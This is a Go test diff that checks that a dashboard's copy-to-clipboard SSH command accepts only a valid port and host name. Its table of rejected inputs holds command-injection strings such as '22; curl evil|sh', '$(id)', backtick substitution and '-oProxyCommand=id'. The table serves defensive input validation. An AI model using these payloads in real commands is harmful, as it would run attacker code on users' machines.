@@ -43,3 +43,22 @@ func TestCardActionsWithHostileDescriptor(t *testing.T) {
 		t.Fatalf("a script URL reaches a link:\n%s", out)
 	}
 }
+
+// The CRaSH SSH command is put on the clipboard to be pasted in a terminal: only a port and a host name are accepted in it.
+func TestSSHCopyCommandOnlyForAPortAndAHost(t *testing.T) {
+	mk := func(port, host string) instances.Instance {
+		return instances.Instance{"DEPLOYMENT_CRASH_ENABLED": "true", "DEPLOYMENT_CRASH_SSH_PORT": port, "DEPLOYMENT_EXT_HOST": host}
+	}
+	if out := DeploymentActions(mk("10003", "acc.example.org")); !strings.Contains(out, `data-copy-text="ssh -p 10003 root@acc.example.org"`) {
+		t.Fatalf("the normal command is gone:\n%s", out)
+	}
+	for _, c := range [][2]string{
+		{"22; curl evil|sh", "acc.example.org"}, {"10003", "x; curl evil|sh"}, {"10003", "acc.example.org && id"}, {"10003", "$(id).example.org"},
+		{"10003", "a`id`.org"}, {"10003 -o ProxyCommand=id", "acc.example.org"}, {"-1", "acc.example.org"}, {"10003", "-oProxyCommand=id"},
+		{"10003", "a b"}, {"1000000", "acc.example.org"}, {"", "acc.example.org"}, {"10003", ""},
+	} {
+		if out := DeploymentActions(mk(c[0], c[1])); strings.Contains(out, "ssh -p") {
+			t.Errorf("port %q host %q reach the clipboard:\n%s", c[0], c[1], out)
+		}
+	}
+}
